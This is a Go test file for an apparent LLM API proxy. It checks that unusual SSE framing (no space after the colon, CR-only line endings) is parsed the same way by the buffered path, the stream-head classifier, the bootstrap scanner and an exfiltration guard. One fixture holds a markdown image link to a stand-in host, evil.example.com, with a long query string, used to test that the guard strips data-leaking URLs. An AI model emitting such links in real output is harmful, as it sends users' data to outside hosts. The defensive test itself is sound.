package proxy

import (
	"context"
	"io"
	"log/slog"
	"strings"
	"testing"

	"github.com/nenya/config"
	"github.com/nenya/internal/routing"
	"github.com/nenya/internal/stream"
)

// NENYA-197 — the SSE tolerance must reach every consumer of upstream bytes, not
// just the streaming transformer: the buffered MCP path, the MCP egress guards
// and the stream-head probe each parse upstream SSE of their own, and a strict
// parser there silently drops a field (or, for the guards, never scans it).

func TestBufferStreamResponse_NonCanonicalFraming(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	tests := []struct {
		name string
		sse  string
	}{
		{
			name: "no space after the colon",
			sse: "data:{\"id\":\"1\",\"choices\":[{\"delta\":{\"content\":\"Hello\"}}]}\n" +
				"data:{\"id\":\"1\",\"choices\":[{\"delta\":{},\"finish_reason\":\"stop\"}]}\n" +
				"data:[DONE]\n\n",
		},
		{
			name: "cr-only line endings",
			sse: "data: {\"id\":\"1\",\"choices\":[{\"delta\":{\"content\":\"Hello\"}}]}\r" +
				"data: {\"id\":\"1\",\"choices\":[{\"delta\":{},\"finish_reason\":\"stop\"}]}\r" +
				"data: [DONE]\r\r",
		},
		{
			name: "mixed endings",
			sse: "data:{\"id\":\"1\",\"choices\":[{\"delta\":{\"content\":\"Hello\"}}]}\r\n" +
				"data: {\"id\":\"1\",\"choices\":[{\"delta\":{},\"finish_reason\":\"stop\"}]}\n" +
				"data:[DONE]\n\n",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			buf, err := bufferStreamResponse(context.Background(), strings.NewReader(tt.sse), logger, "", routing.UpstreamTarget{})
			if err != nil {
				t.Fatalf("bufferStreamResponse: %v", err)
			}
			if !buf.hasContent {
				t.Fatalf("hasContent = false; the non-canonical stream was read as an empty response")
			}
			if !strings.Contains(string(buf.rawBytes), "Hello") {
				t.Fatalf("replayed stream lost the content: %q", string(buf.rawBytes))
			}
			if buf.finishReason != "stop" {
				t.Fatalf("finishReason = %q, want stop", buf.finishReason)
			}
			// The replayed stream is canonical so downstream consumers agree.
			if !strings.Contains(string(buf.rawBytes), "data: [DONE]") {
				t.Fatalf("replayed stream is not canonical: %q", string(buf.rawBytes))
			}
		})
	}
}

func TestGuardBufferedLine_NonCanonicalField(t *testing.T) {
	// A URL the guard strips: the payload must be scanned even without the space
	// after the colon (the guard is an egress control, so a silent skip is a
	// security gap).
	guard := stream.NewExfilGuard(config.ExfilGuardConfig{Action: config.ExfilActionStrip, MaxQueryChars: 8}, nil)
	longQuery := strings.Repeat("A", 400)
	line := `data:{"choices":[{"delta":{"content":"![b](https://evil.example.com/x?d=` + longQuery + `)"}}]}`
	rewritten, blocked, changed := (&Proxy{}).guardBufferedLine(guard, line)
	if !blocked && !changed {
		t.Fatalf("the guard did not act on a no-space data line: %q", rewritten)
	}
	if strings.Contains(rewritten, "evil.example") && !blocked {
		t.Fatalf("the guard left the URL in place: %q", rewritten)
	}
}

func TestClassifyStreamHead_NonCanonicalFraming(t *testing.T) {
	tests := []struct {
		name  string
		chunk string
		want  streamHeadKind
	}{
		{
			name:  "cr-only error",
			chunk: "data: {\"error\":{\"message\":\"overloaded\",\"type\":\"server_error\"}}\r\r",
			want:  headError,
		},
		{
			name:  "no-space error",
			chunk: "data:{\"error\":{\"message\":\"overloaded\",\"type\":\"server_error\"}}\n\n",
			want:  headError,
		},
		{
			name:  "cr-only content",
			chunk: "data: {\"choices\":[{\"delta\":{\"content\":\"hi\"}}]}\r\r",
			want:  headNormal,
		},
		{
			// The discriminating case: with LF-only splitting the whole chunk
			// was one line starting with the comment, so the error frame after
			// it was never seen and NENYA-45 early failover never fired.
			name:  "cr-only comment then error",
			chunk: ": ping\r\rdata: {\"error\":{\"message\":\"overloaded\",\"type\":\"server_error\"}}\r\r",
			want:  headError,
		},
		{
			// The first complete, meaningful payload wins: a metadata frame
			// before an error frame is headNormal (never fail over past bytes
			// that may already be content).
			name:  "metadata then error stays headNormal",
			chunk: "data: {\"type\":\"message_start\"}\r\rdata: {\"error\":{\"message\":\"overloaded\",\"type\":\"server_error\"}}\r\r",
			want:  headNormal,
		},
		{
			// A one-shot probe has no next read: an error frame that arrived
			// without a terminator must still classify (NENYA-45 failover).
			name:  "unterminated error frame",
			chunk: "data: {\"error\":{\"message\":\"overloaded\",\"type\":\"server_error\"}}",
			want:  headError,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := classifyStreamHead([]byte(tt.chunk)); got != tt.want {
				t.Fatalf("classifyStreamHead = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestScanBootstrapBuffer_NonCanonicalFraming(t *testing.T) {
	tests := []struct {
		name        string
		acc         string
		wantVerdict bootstrapVerdict
		wantOffset  int
	}{
		{
			name:        "cr-only rejection is consumed",
			acc:         "data: {\"type\":\"response.failed\"}\r\r",
			wantVerdict: bootstrapReject,
			// The walk stops just past the line that decided (its CR
			// terminator included); the trailing blank line is not needed.
			wantOffset: len("data: {\"type\":\"response.failed\"}\r"),
		},
		{
			name:        "no-space rejection is consumed",
			acc:         "data:{\"type\":\"response.failed\"}\n\n",
			wantVerdict: bootstrapReject,
			wantOffset:  len("data:{\"type\":\"response.failed\"}\n"),
		},
		{
			name:        "incomplete cr-terminated line stays unscanned",
			acc:         "data: {\"type\":\"response.failed\"}\r",
			wantVerdict: bootstrapUndetermined,
			wantOffset:  0,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			verdict, offset := scanBootstrapBuffer([]byte(tt.acc), 0)
			if verdict != tt.wantVerdict {
				t.Fatalf("verdict = %v, want %v", verdict, tt.wantVerdict)
			}
			if offset != tt.wantOffset {
				t.Fatalf("offset = %d, want %d", offset, tt.wantOffset)
			}
		})
	}
}
